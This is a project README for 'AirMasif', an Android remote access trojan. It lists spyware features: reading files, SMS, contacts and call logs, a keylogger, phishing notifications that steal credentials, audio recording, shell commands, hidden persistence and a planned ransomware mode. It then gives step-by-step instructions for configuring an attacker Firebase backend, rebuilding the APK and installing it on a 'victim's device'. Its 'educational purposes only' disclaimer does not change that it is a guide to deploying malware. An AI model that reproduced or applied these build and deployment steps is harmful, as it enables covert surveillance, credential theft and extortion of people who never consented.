<p align="center">
<img src='WEBPANEL/img/logo.png' style="height:100px;width:100px;" >
</p>
<h1 align=center>AirMasif</h1>

#### A multifunctional Android RAT with GUI based Web Panel without port forwarding.

## Features
 - Read all the files of Internal Storage
 - Download Any Media to your Device from Victims Device
 - Get all the system information of Victim Device
 - Retrieve the List of Installed Applications
 - Retrive SMS
 - Retrive Call Logs
 - Retrive Contacts
 - Send SMS
 - Gets all the Notifications 
 - Keylogger
 - Admin Permission 
 - Show Phishing Pages to steal credentials through notification.
    - Steal credentials through pre built phishing pages
    - Open any suspicious website through notification to steal credentials.
 - Record Audio
 - Play music in Victim's device
 - Vibrate Device
 - Text To Speech 
 - Change Wallpaper
 - Run shell Commands
 - Pre Binded with [Instagram Webview Phishing ](https://github.com/Th30neAnd0nly/PI)
 - Runs In Background 
    - Auto Starts on restarting the device
    - Auto Starts when any notification arrives
 - No port forwarding needed



## Requirements
 - [Firebase Account](https://firebase.google.com/?hl=id)
 - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) ( For PC ) or 
[ApkTool M](https://maximoff.su/apktool/?lang=en) ( for Android)


## How to Build 
  ### Firebase Setup
 1. Create an Firebase Account and afterwords create a new project with any name.
 1. Enable Firebase Database and Firebase Storage.
 1. In Firebase Database Click on the rules and set `.read` and `.write` to `true`
    - ```js
          {
           "rules": {
                   ".read": "true",
                   ".write": "true"
                    }
          }
      ```
 1. In Firebase Storage allow reads and writes for all paths.
    - ```js
        rules_version = '2';
        service firebase.storage {
        match /b/{bucket}/o {
            match /{allPaths=**} {
               allow read, write 
              }
          }
       }
      ```
 1. Now Go to project overview and create an Android App and download the `google-services.json` file.
 1. Also create a web app and copy the config of webapp.
   ### Panel Setup
 1. You can use Github Pages or any Hosting Website for hosting the panel.
 1. Open [index.html](./WEB%20PANEL/index.html) File and from [line number 16](https://github.com/Th30neAnd0nly/AIRAVAT/blob/302dca641bb04c6bed72d1b2cebdfc79ccfbb046/WEB%20PANEL/index.html#L16) replace the config with your web app config which you have created on Step 6.
 1. Save the file , Your Panel Setup is completed.
 ### Android RAT
 1. Download [AirMasif.apk](https://github.com/bayfrs/AirMasif/blob/master/ANDROIDAPP/AirMasif.apk?raw=true)
 1. Decompile it using any Decompiler recommend above.
 1. Now open `res/values/strings.xml` file.
 1. Replace values of `firebase_database_url ` , `google_api_key` , `google_app_id` , `google_storage_bucket` , `project_id` with your Firebase Account using `google-services.json` file which you have downloaded on step 5
    - Example 
       ```xml 
       <string name="firebase_database_url">https://your_database_url.firebase.com</string>
       <string name="google_api_key">your_api_key</string>
       <string name="google_app_id">your_app_id</string>
       <string name="google_storage_bucket">your_storage_bucket_url</string>
       <string name="project_id">project_id</string>
       ```
 1. Now compile the code with appt2.
 1. Install the app in victim's device and give all the permissions after that the connection will show up in web panel.
  ### TUTORIAL 
 1. [Blog](https://bayfrs.blogspot.com)
 2. [Discord](
 2. [Youtube](https://youtu.be/COyGTXsSaoY) => Coming soon
[<img src="https://i.ytimg.com/vi/Hc79sDi3f0U/maxresdefault.jpg" width="50%">](https://www.youtube.com/watch?v=COyGTXsSaoY "Now in Android: 55")

## AirMasif <img src='WEBPANEL/img/logo.png' style="height:30px;width:30px;" >
 1. Read , Delete files from victim's device
 1. Encrypt any file in victim's device
 1. Capture Photo from Camera
 1. Get Sim Card Information
 1. Ransomware (encrypt all the files and show the notification demanding for ransom)
 1. Auto Start Permission for all chinese vendors.
 1. Hidden App without Foreground service notification (full stealth mode)

## Contact Info 
 1. [Telegram](https://)

## Thanks To
  - [Allah Swt.]()
  - [YagamiLight17.](https://github.com/YagamiLight17)
  - [Morsmalleo.](https://github.com/Morsmalleo)
  - [Prateek-Chaubey](https://github.com/prateek-chaubey)
  - [Github.](https://github.com)

## DISCLAIMER
<p align="center">
 TO BE USED FOR EDUCATIONAL PURPOSES ONLY
</p>


The use of the AirMasif is COMPLETE RESPONSIBILITY of the END-USER. Developers assume NO liability and are NOT responsible for any misuse or damage caused by this program. Please read [LICENSE](LICENSE).






